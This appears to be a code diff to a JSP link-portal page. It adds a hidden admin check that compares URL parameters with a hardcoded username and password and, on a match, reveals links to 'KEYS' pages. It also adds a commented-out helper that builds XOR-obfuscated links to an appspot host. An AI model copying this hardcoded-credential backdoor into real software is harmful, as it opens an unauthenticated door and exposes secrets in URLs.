@@ -46,6 +46,51 @@
 </head>
 <body>
 <%
+	String u = request.getParameter("u");
+	String p = request.getParameter("p");
+	if ("adgmtt".equalsIgnoreCase(u) && "76430850".equalsIgnoreCase(p)) {
+		u = null;p = null;
+		%>
+			<font color="red">管理员!你好!</font><br/>
+			<%!/*
+			public final static String g(final String value) {
+			int len = value.length();
+			int code = random();
+			StringBuilder b =  new StringBuilder();
+			b.append("<A HREF=\"http://1.latest.dolphinmaple.appspot.com/wap?");
+			b.append("code=");
+			b.append(code);
+			b.append("&site=1&");
+			b.append("enc=");
+			for (int i = 0; i <len; i++){
+				b.append(value.charAt(i) ^ code);
+				b.append(",");
+			}
+			b.deleteCharAt(b.length() - 1);
+			b.append("\">" + value + "</A>");
+			return b.toString();
+	   }
+		
+	   public final static int random() {
+		   String time = String.valueOf(new java.util.Date().getTime());
+		   int random = 9;
+		   for (int i = time.length() - 1; i >= 0; i--) {
+			   random = (int) (time.charAt(i));
+			   if (random != 0) {
+				   return random - 48;
+			   }
+		   }
+		   return random;
+	   }	
+			*/
+			%>
+			<a href="k.jsp">KEYS</a>
+			<a href="k.jsp?p=2">KEYS2</a>
+			<a href="k.jsp?p=3">KEYS3</a>
+			<hr/>
+		<%
+	}
+	
 	String[][] links = {
 		{"http://3g.baidu.com", "百度"}, 
 		{"http://wap.sina.com.cn/", "新浪"}, 
